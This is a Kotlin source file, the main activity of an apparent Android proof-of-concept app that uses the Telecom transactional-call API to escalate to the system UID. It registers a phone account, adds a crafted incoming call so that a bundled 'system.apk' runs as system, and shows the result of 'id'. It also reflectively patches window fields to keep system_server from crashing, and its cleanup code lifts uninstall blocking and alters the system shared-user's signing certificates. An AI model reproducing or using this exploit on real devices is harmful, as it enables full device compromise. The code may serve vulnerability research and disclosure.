package poc.sithi.tlpe

import android.app.Activity
import android.content.ComponentName
import android.os.Bundle
import android.telecom.CallAttributes
import android.telecom.CallControlCallback
import android.telecom.CallEndpoint
import android.telecom.CallEventCallback
import android.telecom.DisconnectCause
import android.telecom.PhoneAccount
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import poc.sithi.tlpe.databinding.ActivityMainBinding
import java.util.function.Consumer

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    var isSystem = (android.os.Process.myUid() == 1000)

    override fun onCreate(savedInstanceState: Bundle?) {
        if (isSystem) {
            /***
             * system_server process may not have properly initialized application
             * contexts, making PhoneWindow.generateDecor -> ContextImpl.initializeTheme
             * throw NPE due to null mResources, and crash system_server on app launch.
             * we prevent this by forcing PhoneWindow to use existing context for decor.
             */
            val window = Activity::class.java.getMethod("getWindow").invoke(this)
            val useDecorCtx = window.javaClass.getDeclaredField("mUseDecorContext")
            useDecorCtx.isAccessible = true
            useDecorCtx.setBoolean(window, false)
        } else {
            if (!isSystemApkAvailable()){
                Toast.makeText(this,
                    "The system flavor APK wasn't placed in " +
                            "src/poc/assets/, exiting...",
                    Toast.LENGTH_LONG).show()
                finish()
            }
        }

        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setSupportActionBar(binding.toolbar)

        binding.textView.text = Utils.sh("id")

        if(isSystem){
            binding.start.isEnabled = false
            binding.uninstall.isEnabled = true
        }

        binding.start.setOnClickListener {
            val telecomManager = this.getSystemService(TELECOM_SERVICE) as TelecomManager
            val handle = PhoneAccountHandle(ComponentName(packageName,
                "$packageName.DummyService"), "A")

            telecomManager.registerPhoneAccount(
                PhoneAccount.builder(handle, "A")
                    .setCapabilities(PhoneAccount.CAPABILITY_SUPPORTS_TRANSACTIONAL_OPERATIONS)
                    .build()
            )

            telecomManager.addCall(
                CallAttributes.Builder(handle,
                    CallAttributes.DIRECTION_INCOMING,
                    "A", "tel:0".toUri()).build(),
                { it.run() },
                { },
                object : CallControlCallback {
                    override fun onAnswer(p0: Int, p1: Consumer<Boolean?>) {}
                    override fun onCallStreamingStarted(p0: Consumer<Boolean?>) {}
                    override fun onDisconnect(p0: DisconnectCause, p1: Consumer<Boolean?>) {}
                    override fun onSetActive(p0: Consumer<Boolean?>) {}
                    override fun onSetInactive(p0: Consumer<Boolean?>) {}
                },
                object : CallEventCallback {
                   override fun onAvailableCallEndpointsChanged(p0: List<CallEndpoint?>) {}
                    override fun onCallEndpointChanged(p0: CallEndpoint) {}
                    override fun onCallStreamingFailed(p0: Int) {}
                    override fun onEvent(p0: String, p1: Bundle) {}
                    override fun onMuteStateChanged(p0: Boolean) {}
                }
            )
        }

        binding.uninstall.setOnClickListener {
            val pm = RPMS()
            /* re-allow uninstall */
            pm.setBlockUninstallLPw(0, packageName, false)
            /* fix system certificates */
            val sysSigns = pm.getSigningDetails(pm.getSharedUserLPw("android.uid.system"))
            val pastCerts = sysSigns.javaClass.getDeclaredField("mPastSigningCertificates")
            pastCerts.isAccessible = true
            pastCerts.set(sysSigns, null)
            /* uninstall */
            Utils.uninstall(this, packageName)
        }
    }
    fun isSystemApkAvailable(): Boolean {
        try {
            val fd = this.assets?.openFd("system.apk")
            fd!!.close()
            return true
        } catch (_: Exception) {
            return false
        }
    }

}